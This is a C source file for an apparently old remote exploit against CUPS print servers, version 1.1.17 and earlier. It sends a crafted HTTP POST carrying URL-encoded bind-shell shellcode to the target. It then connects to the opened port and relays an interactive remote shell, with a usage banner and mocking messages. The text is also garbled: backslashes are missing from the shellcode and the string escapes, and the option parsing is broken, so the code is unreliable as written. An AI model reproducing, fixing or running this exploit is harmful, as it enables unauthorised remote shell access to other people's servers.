#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <getopt.h>
#include <string.h>
#include <stdlib.h>

#define BUF_SIZE 4096

#define die(a) { perror("[!] "a); exit(-1); }

int verbose = 0;
char *host = "192.168.0.37";
int port = 631;
unsigned long retaddr = 805289688; /* exploit: *($retaddr * 4) = $address_of_shellcode */

char greet[] = "POST /jobs HTTP/1.1nContent-type: application/x-www-form-urlencodednContent-length: %dnn";
char evilmsg[] = "-%u=";

/*
 * Bind shell hack by s0t4ipv6@shellcode.com.ar
 */
 
char hellcode[]=
  "x31xc0x89xc3xb0x02xcdx80x38xc3x74x05x8dx43x01xcdx80"
  "x31xc0x89x45x10x40x89xc3x89x45x0cx40x89x45x08x8dx4d"
  "x08xb0x66xcdx80x89x45x08x43x66x89x5dx14x66xc7x45x16"
  "x13xd2x31xd2x89x55x18x8dx55x14x89x55x0cxc6x45x10x10"
  "xb0x66xcdx80x40x89x45x0cx43x43xb0x66xcdx80x43x89x45"
  "x0cx89x45x10xb0x66xcdx80x89xc3x31xc9xb0x3fxcdx80x41"
  "x80xf9x03x75xf6x31xd2x52x68x6ex2fx73x68x68x2fx2fx62"
  "x69x89xe3x52x53x89xe1xb0x0bxcdx80";

void usage(char *p){
  printf(
    "Remote CUPS exploit for 1.1.17 and earlier versions \n"
    "by sigdoom [at] bigbox.mine.nu \n"
    "Usage: %s [-t <target>, -p <port>, -o <offset>, -r <retaddr>] \n"
    "t-t <target> – IP of targetn"
    "t-p <port> – port where cupsd runs \n"
    "t-o <offset> – offset for retaddr ($retaddr + $offset) \n"
    "t-r <retaddr> – give exact retaddrn", p);
  exit(0);
}

int main(int argc, char *argv[]){
  struct sockaddr_in dest;
  int i, off, sock;
  fd_set rset;
  char buf[BUF_SIZE], buf2[BUF_SIZE];
  char c;
  
  while ((c = getopt(argc, argv, "ho:p:r:t:v")) > 0 ){
    if (strcmp(c, "t") == 0){
       host = (char *)optarg;
	}
	else if(strcmp(c, "t") == 0){host = (char *)optarg;}
	else if(strcmp(c, "o") == 0){retaddr += atol(optarg);}
	else if(strcmp(c, "r") == 0){retaddr = atol(optarg);}
	else if(strcmp(c, "p") == 0){port = atoi(optarg);}
	else if(strcmp(c, "v") == 0){verbose++;}
	else if(strcmp(c, "h") == 0){usage(argv[0]);}
	else if(strcmp(c, "?") == 0){}
	else if(strcmp(c, ":") == 0){exit(-1);}
  }

  printf("[*] connecting to %s port %dn", host, port);
  printf("[*] trying retaddr = 0x%x; *4 = 0x%xn", retaddr, retaddr*4);

  if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
    die("socket()");
    
  dest.sin_family = AF_INET;
  dest.sin_port = htons(port);
  dest.sin_addr.s_addr = inet_addr(host);
  bzero(&(dest.sin_zero), 8);

  if (connect(sock, (struct sockaddr*)&dest, sizeof(struct sockaddr)) < 0)
    die("connect()");
  

  printf("[*] connected, sending exploit \n");

  off = sprintf(buf, evilmsg, retaddr);
  for (i = 0; i < sizeof(hellcode)-1; i++)
    sprintf(buf+off+i*3, "%%%02X", (unsigned char)hellcode[i]);

  sprintf(buf2, greet, strlen(buf));
  
  if (verbose) {
    printf("%s", buf2);
    printf("%sn", buf);
  }

  write(sock, buf2, strlen(buf2));
  write(sock, buf, strlen(buf));

  printf("[*] done… lets see if we have a shell \n");
  close(sock);

  if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
    die("socket()");

  dest.sin_family = AF_INET;
  dest.sin_port = htons(5074);
  dest.sin_addr.s_addr = inet_addr(host);
  bzero(&(dest.sin_zero), 8);

  system("sleep 2");
  
  if (connect(sock, (struct sockaddr*)&dest, sizeof(struct sockaddr)) < 0) {
    printf("[-] better luck next time! try different offsets maybe \n");
    die("connect()");
  }

  printf("[*] w000t, heres a shell kiddie \n");
  write(sock, "id;uname -an", 12);
  while (1) {
    FD_ZERO(&rset);
    FD_SET(sock,&rset);
    FD_SET(STDIN_FILENO,&rset);
    
    select(sock + 1, &rset, NULL, NULL, NULL);
    
    if (FD_ISSET(sock, &rset)) {
      i = read(sock, buf, BUF_SIZE - 1);
      if (i <= 0) {
        printf("[!] Connection closed \n");
        close(sock);
        exit(0);
      }
      buf[i] = 0;
      printf("%s", buf);
    }
    if (FD_ISSET(STDIN_FILENO, &rset)) {
      i = read(STDIN_FILENO, buf, BUF_SIZE - 1);
      if (i > 0) {
        buf[i]=0;
        write(sock, buf, i);
      }
    }
  }

  return 0;
}

